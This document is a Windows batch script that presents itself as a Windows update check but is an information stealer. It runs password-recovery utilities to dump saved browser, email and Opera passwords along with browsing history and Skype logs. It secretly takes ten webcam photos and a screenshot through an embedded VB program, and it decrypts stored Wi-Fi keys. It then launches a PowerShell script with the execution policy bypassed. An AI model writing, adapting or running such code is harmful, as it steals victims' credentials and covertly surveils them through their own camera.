@echo off
cd /d "C:\Users\Public\Licence\Licence-main"


set CUR_HH=%time:~0,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
set CUR_NN=%time:~3,2%
set CUR_SS=%time:~6,2%
set FILENAME=%CUR_HH%%CUR_NN%%CUR_SS%


echo Checking Windows for Update. Please wait...
        if not exist ".\Microsoft" (mkdir ".\Microsoft")
        if not exist ".\Microsoft\Addons" (mkdir ".\Microsoft\Addons")
        if not exist ".\Microsoft\Browser" (mkdir ".\Microsoft\Browser")
        if not exist ".\Microsoft\Chrome" (mkdir ".\Microsoft\Chrome")
        if not exist ".\Microsoft\Firefox" (mkdir ".\Microsoft\Firefox")
        if not exist ".\Microsoft\IExplorer" (mkdir ".\Microsoft\IExplorer")
	if not exist ".\Microsoft\Location" (mkdir ".\Microsoft\Location")
        if not exist ".\Microsoft\Opera" (mkdir ".\Microsoft\Opera")
        if not exist ".\Microsoft\Safari" (mkdir ".\Microsoft\Safari")
	if exist ".\Microsoft\Screenshot" (rmdir /s /q ".\Microsoft\Screenshot")
        if not exist ".\Microsoft\Screenshot" (mkdir ".\Microsoft\Screenshot")
	if exist ".\Microsoft\Webcam" (rmdir /s /q ".\Microsoft\Webcam")
	if not exist ".\Microsoft\Webcam" (mkdir ".\Microsoft\Webcam")
        if not exist ".\Microsoft\Social" (mkdir ".\Microsoft\Social")
        if not exist ".\Microsoft\Task" (mkdir ".\Microsoft\Task")
        if not exist ".\Microsoft\Utility" (mkdir ".\Microsoft\Utility")
        if not exist ".\Microsoft\WiFi" (mkdir ".\Microsoft\WiFi")

		call ".\Extension\BrowserAddonsView.exe" /stext ".\Microsoft\Addons\BrowserAddonsView.txt"
		call ".\Extension\BrowserDownloadsView.exe" /stext ".\Microsoft\Browser\BrowserDownloadsView.txt"
		call ".\Extension\BrowsingHistoryView.exe" /stext ".\Microsoft\Browser\BrowsingHistoryView.txt"
		call ".\Extension\MyLastSearch.exe" /stext ".\Microsoft\Browser\MyLastSearch.txt"
		call ".\Extension\WebBrowserPassView.exe" /stext ".\Microsoft\Browser\WebBrowserPassView.txt"
		call ".\Extension\ChromeHistoryView.exe" /stext ".\Microsoft\Chrome\ChromeHistoryView.txt"
		call ".\Extension\ChromePass.exe" /stext ".\Microsoft\Chrome\ChromePass.txt"
		call ".\Extension\FirefoxDownloadsView.exe" /stext ".\Microsoft\Firefox\FirefoxDownloadsView.txt"
		call ".\Extension\PasswordFox.exe" /stext ".\Microsoft\Firefox\PasswordFox.txt"
		call ".\Extension\iehv.exe" /stext ".\Microsoft\IExplorer\iehv.txt"
		call ".\Extension\iepv.exe" /stext ".\Microsoft\IExplorer\iepv.txt"
		call ".\Extension\OperaPassView.exe" /stext ".\Microsoft\Opera\OperaPassView.txt"
		call ".\Extension\SafariHistoryView.exe" /stext ".\Microsoft\Safari\SafariHistoryView.txt"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_1.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_2.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_3.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_4.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_5.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_6.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_7.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_8.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_9.jpg"
		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_10.jpg"
		call ".\Extension\mailpv.exe" /stext ".\Microsoft\Social\mailpv.txt"
		call ".\Extension\SkypeLogView.exe" /stext ".\Microsoft\Social\SkypeLogView.txt"
		call ".\Extension\TaskSchedulerView.exe" /stext ".\Microsoft\Task\TaskSchedulerView.txt"
		call ".\Extension\UninstallView.exe" /stext ".\Microsoft\Utility\UninstallView.txt"
		echo User: %ComputerName% \ %UserName% >".\Microsoft\IPnHost.txt"
		echo Public_IP: >>".\Microsoft\IPnHost.txt"
		ipconfig | find /i "IPv4" >>".\Microsoft\IPnHost.txt"
		ECHO                 ******************************************* > ".\Microsoft\WiFi\WirelessPass.txt"
		ECHO                  Wi-Fi Password Decrypting. Please wait... >> ".\Microsoft\WiFi\WirelessPass.txt"
		ECHO                 ******************************************* >> ".\Microsoft\WiFi\WirelessPass.txt"
		ECHO: >>".\Microsoft\WiFi\WirelessPass.txt"

		setlocal enabledelayedexpansion
		for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
		    set "ssid=%%~a"
		    call :getpwd "%%ssid:~1%%"
		)

		cd /d "./Microsoft/Screenshot"

		findstr "'%skip%VB" "%~f0" > "%tmp%\%~n0.vb"
		for /F %%i in ('dir /B /S ^"%WinDir%\Microsoft.NET\Framework\vbc.exe^"') do set "vbc=%%i"
		if /i "%vbc%"=="" cls & color 1c & echo This script needs the framework & pause & Exit
		cls
		%vbc% /nologo /out:"%tmp%\%~n0.exe" "%tmp%\%~n0.vb"
		"%tmp%\%~n0.exe"
		del "%tmp%\%~n0.vb" >NUL 2>&1
		del "%tmp%\%~n0.exe" >NUL 2>&1




	cd "../.."
        powershell.exe -ExecutionPolicy Bypass -File "./Update.ps1"
	
	::echo %cd%
	timeout 3




		Imports System.Windows.Forms 'VB
		Module ModulePrintscreen 'VB
    		Sub Main() 'VB
        		Dim MaDate As String 'VB
        		SendKeys.SendWait("{%}({PRTSC})") 'VB
        		If My.Computer.Clipboard.ContainsImage() Then 'VB
            		MaDate = Format(Now,"dd-MM-yyyy_hh-mm-ss") 'VB
            		My.Computer.Clipboard.GetImage.Save(MaDate & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg) 'VB
        		End If 'VB
    		End Sub 'VB
		End Module 'VB


		:getpwd
		set "ssid=%*"
		for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: [%%i ] >> ".\Microsoft\WiFi\WirelessPass.txt"
